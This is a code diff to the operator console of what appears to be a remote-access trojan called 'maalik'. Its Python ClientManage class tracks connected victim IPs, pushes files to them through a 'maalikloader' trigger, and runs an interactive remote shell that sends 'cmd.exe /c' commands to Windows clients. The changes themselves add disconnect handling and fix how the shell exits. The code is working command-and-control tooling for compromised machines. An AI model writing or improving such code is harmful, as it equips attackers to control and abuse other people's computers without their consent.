@@ -233,7 +233,7 @@ class ClientManage:
                     #print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] File opened " + mfile + " ("+str(bufferst.st_size) + " bytes)" )
                     time.sleep(1)
                     self.SendData("fdll") # Send File Receive trigger for client
-                    trigger = "maalikloader" + ":" + str(bufferst.st_size) 
+                    trigger =  "maalikloader" + ":" + str(bufferst.st_size) 
                     self.SendData(trigger) # Send Trigger
                     self.SendBytes(data) # Send file
                     #print("["+Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] Uploading file.")
@@ -245,7 +245,12 @@ class ClientManage:
 
         while(session):
             try:
-                location = clients.index(self.client_socket)
+                try:
+                    location = clients.index(self.client_socket)
+                except ValueError:
+                    print("[X] Client disconnected unexpectedly, Session closed.")
+                    session = False
+                    break
                 ip = iplist[location]
                 main = input(Style.BRIGHT + Fore.LIGHTCYAN_EX + "maalik >> ({ip}) : ".format(ip = ip) + Style.RESET_ALL)
                 if(main == "ls"):
@@ -280,14 +285,14 @@ class ClientManage:
                     while (shell):
                         sh = input(Style.BRIGHT + "( " + Fore.RED + ip + Style.RESET_ALL + Style.BRIGHT + " ) > ")
                         if(len(sh) > 0):
-                            self.SendData("cmd.exe /c "+ sh)
-                            self.WaitForReply()
-                            if (sh == "exit"):
+                            if(sh != "exit"):
+                                self.SendData("cmd.exe /c "+ sh)
+                                self.WaitForReply()
+                            else:
                                 shell = False
                                 shellmode = False
                                 break
                             
-
                 elif(main == "exit"):
                     session = False
 
